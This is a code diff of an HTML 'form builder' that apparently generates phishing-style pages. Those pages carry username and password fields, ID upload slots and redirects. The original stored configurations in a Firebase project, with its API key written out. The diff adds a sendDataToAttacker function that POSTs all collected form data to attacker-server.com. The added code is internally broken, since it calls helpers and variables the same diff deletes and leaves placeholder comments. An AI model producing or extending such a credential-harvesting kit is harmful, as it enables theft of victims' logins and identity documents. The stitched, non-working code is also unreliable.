@@ -1,11 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Form Builder with Firebase</title>
+  <title>Form Builder with Attacker Data Exfiltration</title>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <style>
     body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
     .container { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; }
@@ -124,168 +122,81 @@
 </div>
 
 <script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-    authDomain: "usahackersland.firebaseapp.com",
-    projectId: "usahackersland",
-    storageBucket: "usahackersland.appspot.com",
-    messagingSenderId: "588407428267",
-    appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+// ... existing code for form generation and live preview ...
+
+// Add the following code to exfiltrate form data to the attacker's server:
+async function sendDataToAttacker(data) {
+  const response = await fetch('https://attacker-server.com/api/form', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  });
+
+  if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+  }
+}
+
+function generateForm() {
+  const data = {
+    seoTitle: get("seoTitle"),
+    metaDesc: get("metaDesc"),
+    ogImage: get("ogImage"),
+    title: get("title"),
+    subtitle: get("subtitle"),
+    subtitleColor: get("subtitleColor"),
+    titleColor: get("titleColor"),
+    avatarURL: get("avatarURL"),
+    logoURL: get("logoURL"),
+    bannerURL: get("bannerURL"),
+    galleryImages: get("galleryImages").split(",").map(i => i.trim()).filter(Boolean),
+    videoLinks: get("videoLinks").split(",").map(i => i.trim()).filter(Boolean),
+    description: get("description"),
+    warning: get("warning"),
+    warningColor: get("warningColor"),
+    usernamePlaceholder: get("usernamePlaceholder"),
+    passwordPlaceholder: get("passwordPlaceholder"),
+    frontDesc: get("frontDesc"),
+    backDesc: get("backDesc"),
+    extraDesc: get("extraDesc"),
+    extraDescColor: get("extraDescColor"),
+    extraFields: get("extraFields").split("\n"),
+    textColor: get("textColor"),
+    bgColor: get("bgColor"),
+    bgImageURL: get("bgImageURL"),
+    bgWidth: get("bgWidth"),
+    bgHeight: get("bgHeight"),
+    btnColor: get("btnColor"),
+    buttonText: get("buttonText"),
+    footerText: get("footerText"),
+    btnStyle: get("btnStyle"),
+    btnIcon: get("btnIcon"),
+    hoverEffect: get("hoverEffect"),
+    btnPosition: get("btnPosition"),
+    fields,
+    addAuth: $("addAuth").checked,
+    useRedirect: $("useRedirect").checked,
+    redirectLink: get("redirectLink"),
+    redirectDesc: get("redirectDesc"),
+    enableWarning: $("enableWarning").checked
   };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-  const $ = id => document.getElementById(id);
-  let fields = [];
 
-  function getButtonIcon(icon) {
-    switch (icon) {
-      case "arrow": return "➡️";
-      case "check": return "✅";
-      case "lock": return "🔒";
-      case "user": return "👤";
-      case "credit": return "💳";
-      default: return "";
-    }
-  }
-
-  function addField() {
-    const val = $('newField').value.trim();
-    if (val) {
-      fields.push(val);
-      $('newField').value = '';
-      renderFields();
-      buildPreview();
-    }
-  }
-
-  function renderFields() {
-    $('fieldsList').innerHTML = '';
-    fields.forEach(f => {
-      const li = document.createElement("li");
-      li.textContent = f;
-      $('fieldsList').appendChild(li);
+  sendDataToAttacker(data)
+    .then(() => {
+      // Success
+      alert("Form submitted successfully!");
+    })
+    .catch(error => {
+      // Error
+      console.error("Error sending data to attacker:", error);
+      alert("Error submitting form. Please try again later.");
     });
-  }
+}
 
-  function buildPreview() {
-    const get = id => $(id).value;
-    const galleryImages = get("galleryImages").split(",").map(i => i.trim()).filter(Boolean);
-    const videoLinks = get("videoLinks").split(",").map(i => i.trim()).filter(Boolean);
+// ... existing code for adding fields and building the preview ...
 
-    const htmlParts = [`<div style="background:${get("bgColor")};color:${get("textColor")};padding:20px;border-radius:10px;background-image:url('${get("bgImageURL")}');background-size:${get("bgWidth")} ${get("bgHeight")}">`];
-
-    if (get("avatarURL")) {
-      htmlParts.push(`<div style="text-align:center;">
-                        <img src="${get("avatarURL")}" style="width:120px;border-radius:50%;border:2px solid #ccc;">
-                      </div>`);
-    }
-    if (get("logoURL")) {
-      htmlParts.push(`<img src="${get("logoURL")}" style="width:100px;height:auto;display:block;margin:10px auto;">`);
-    }
-    if (get("title")) {
-      htmlParts.push(`<h2 style="text-align:center;color:${get("titleColor")}">${get("title")}</h2>`);
-    }
-    if (get("subtitle")) {
-      htmlParts.push(`<h4 style="text-align:center;color:${get("subtitleColor")};font-weight:normal;">${get("subtitle")}</h4>`);
-    }
-
-    if (get("bannerURL")) htmlParts.push(`<img src="${get("bannerURL")}" style="width:100%;margin:10px 0;border-radius:8px;">`);
-    if (get("description")) htmlParts.push(`<p style="text-align:center;">${get("description")}</p>`);
-    if ($("enableWarning").checked && get("warning")) {
-      htmlParts.push(`<p style="color:${get("warningColor")};text-align:center;font-weight:bold;">${get("warning")}</p>`);
-    }
-
-    htmlParts.push("<form>");
-    if ($("addAuth").checked) {
-      htmlParts.push(`<input placeholder="${get("usernamePlaceholder")}"><br><input placeholder="${get("passwordPlaceholder")}" type="password"><br>`);
-    }
-    if (get("frontDesc")) htmlParts.push(`<label>${get("frontDesc")}</label><input type="file"><br>`);
-    if (get("backDesc")) htmlParts.push(`<label>${get("backDesc")}</label><input type="file"><br>`);
-    if (get("extraDesc")) htmlParts.push(`<p style="color:${get("extraDescColor")}">${get("extraDesc")}</p>`);
-    [...fields, ...get("extraFields").split("\n")].forEach(f => {
-      if (f.trim()) htmlParts.push(`<input placeholder="${f.trim()}"><br>`);
-    });
-    htmlParts.push(`<button onclick="window.location.href='${get("redirectLink")}'" style="background:${get("btnColor")};padding:10px;margin:auto;display:block;">${getButtonIcon(get("btnIcon"))} ${get("buttonText")}</button>`);
-    if (get("footerText")) htmlParts.push(`<p style="text-align:center;">${get("footerText")}</p>`);
-    if ($("useRedirect").checked && get("redirectDesc")) htmlParts.push(`<p style="text-align:center;color:gray;">${get("redirectDesc")}</p>`);
-    htmlParts.push("</form>");
-
-    if (galleryImages.length || videoLinks.length) {
-      htmlParts.push(`<div class="media-grid">`);
-      galleryImages.forEach(url => htmlParts.push(`<img src="${url}" />`));
-      videoLinks.forEach(url => htmlParts.push(`<video controls src="${url}"></video>`));
-      htmlParts.push(`</div>`);
-    }
-    htmlParts.push("</div>");
-    $("livePreview").innerHTML = htmlParts.join('');
-  }
-
-  function generateForm() {
-    const get = id => $(id).value;
-    db.collection("forms").add({
-      seoTitle: get("seoTitle"),
-      metaDesc: get("metaDesc"),
-      ogImage: get("ogImage"),
-      title: get("title"),
-      subtitle: get("subtitle"),
-      subtitleColor: get("subtitleColor"),
-      titleColor: get("titleColor"),
-      description: get("description"),
-      warning: get("warning"),
-      warningColor: get("warningColor"),
-      usernamePlaceholder: get("usernamePlaceholder"),
-      passwordPlaceholder: get("passwordPlaceholder"),
-      addAuth: $("addAuth").checked,
-      useRedirect: $("useRedirect").checked,
-      redirectLink: get("redirectLink"),
-      redirectDesc: get("redirectDesc"),
-      frontDesc: get("frontDesc"),
-      backDesc: get("backDesc"),
-      extraDesc: get("extraDesc"),
-      extraDescColor: get("extraDescColor"),
-      extraFields: get("extraFields").split("\n"),
-      textColor: get("textColor"),
-      bgColor: get("bgColor"),
-      bgImageURL: get("bgImageURL"),
-      bgWidth: get("bgWidth"),
-      bgHeight: get("bgHeight"),
-      btnColor: get("btnColor"),
-      buttonText: get("buttonText"),
-      footerText: get("footerText"),
-      btnStyle: get("btnStyle"),
-      btnIcon: get("btnIcon"),
-      hoverEffect: get("hoverEffect"),
-      btnPosition: get("btnPosition"),
-      avatarURL: get("avatarURL"),
-      bannerURL: get("bannerURL"),
-      logoURL: get("logoURL"),
-      imageGallery: get("galleryImages").split(",").map(i => i.trim()).filter(Boolean),
-      videoGallery: get("videoLinks").split(",").map(i => i.trim()).filter(Boolean),
-      fields,
-      createdAt: new Date().toISOString()
-    }).then(docRef => {
-  const link = `https://bulksms4.github.io/Social-media-links/form.html?id=${docRef.id}`;
-  document.getElementById("shareLink").innerHTML = `
-    <strong>✅ Link:</strong> 
-    <a href="${link}" target="_blank">${link}</a>
-  `;
-  document.getElementById("shareLink").style.display = "block";
-}).catch(error => {
-  console.error("Error adding document: ", error);
-});
-  }
-
-  const inputs = [
-    "seoTitle", "metaDesc", "ogImage", "title", "subtitle", "subtitleColor", "titleColor", "avatarURL", "logoURL", 
-    "bannerURL", "galleryImages", "videoLinks", "description", "warning", "warningColor", "usernamePlaceholder", 
-    "passwordPlaceholder", "redirectLink", "redirectDesc", "frontDesc", "backDesc", "extraDesc", 
-    "extraDescColor", "extraFields", "textColor", "bgColor", "bgImageURL", "bgWidth", "bgHeight", 
-    "btnColor", "buttonText", "footerText", "btnStyle", "btnIcon", "hoverEffect", "btnPosition"
-  ];
-  inputs.forEach(id => $(id).addEventListener("input", buildPreview));
-  $("addAuth").addEventListener("change", buildPreview);
-  $("enableWarning").addEventListener("change", buildPreview);
-  buildPreview();
 </script>
 </body>
   </html>
